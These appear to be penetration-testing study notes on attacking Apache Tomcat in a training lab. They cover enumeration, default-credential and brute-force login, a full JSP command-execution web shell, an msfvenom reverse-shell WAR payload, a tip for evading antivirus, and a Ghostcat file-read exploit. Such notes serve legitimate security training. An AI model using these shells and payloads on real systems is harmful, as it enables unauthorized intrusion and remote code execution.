# Discovery and Enumeration 
## Discovery
```shell
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
```
### General Folder Structure of Tomcat
```
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```
* `Bin` folder stores scripts and binaries for Tomcat to run
* `Conf` folder stores various configuration files used by Tomcat.
	* `tomcat-users.xml` file stores user credentials and their assigned roles. 
* `lib` folder holds various JAR files needed for Tomcat to function 
* `work` folder acts as a cache and used to store data during runtime. 
* `webapps` folder is the default webroot
```shell
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class   
```
* Each Folder is expected to have the same format. 
* `WEB-INF/web.xml` is known as the deployment descriptor. 
	* Stores information about the routes used by the application and the classes.
* All compiled classes used by the application should be stored in `WEB-INF/classes` 
	* These might contain important business logic and sensitive information. 
	* A Vulnerability here could compromise the whole web server.
* `jsp` folder contains [Jakarta Server Pages](https://en.wikipedia.org/wiki/Jakarta_Server_Pages) which are similar to PHP files. 
#### Example Web.xml
```xml
<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app>   
```
* First a new serverlet named `AdminServlet`. This is mapped to the class `com.inlanefreight.api.AdminServlet`. 
	* As Java uses dot notation the class is stored in `classes/com/inlanefreight/api/AdminServlet.class`
* Second a servlet mapping is created to map requests to `/admin`. This means any requests for `/admin` will redirect to `AdminServlet.class`. 
#### Example tomcat-users.xml
```xml
!-- user manager can access only manager section -->
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<!-- user admin can access manager and admin section both -->
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />
```
* Shows what each roles have access to and the  passwords for them
## Enumeration
* Want to look for `/manager` and the `/host-manager` pages.
```shell
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
```
* Attempt to use credentials such as `tomcat:tomcat`, `admin:admin`
# Attacking Tomcat
## Tomcat Manager 
### Login Brute Force
```shell
use auxillary/scanner/http/tomcat_mgr_login set VHOST web01.inlanefreight.local
set RPORT 8180
set stop_on_success true
set rhosts 10.129.201.58
```
If not behaving correctly, set a proxy up with burp
```shell
set PROXIES HTTP:127.0.0.1:8080
```
### WAR File Upload
* Many Tomcat installations provide a GUI interface to manage the applications. 
* Interface is located at `/manager/html` by default. 
* Valid credentials can be used to upload a .WAR file. 
#### Example WAR Shell
```java
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```
```shell
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```
#### MSFVenom
```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```
#### MSFConsole
[multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/)

#### Lightweight Shell
https://github.com/SecurityRiskAdvisors/cmd.jsp
* Wont get detected on many AVs. 
* Change some strings to make it even hard to detect:
```java
FileOutputStream(f);stream.write(m);o="uPlOaDeD:
```

## CVEs
### CVE-2020-1938 Ghostcat
https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
* Unauthenticated LFI. 
* All Tomcat versions before `9.0.31`, `8.5.51`, `7.0.100` were vulnerable.
* Misconfigured Apache Jserv Protocol (AJP),
	* Usually running on port 8009
```shell
nmap -sV -p 8009,8080 app-dev.inlanefreight.local

<snip>

8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30
```

```shell
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 
```
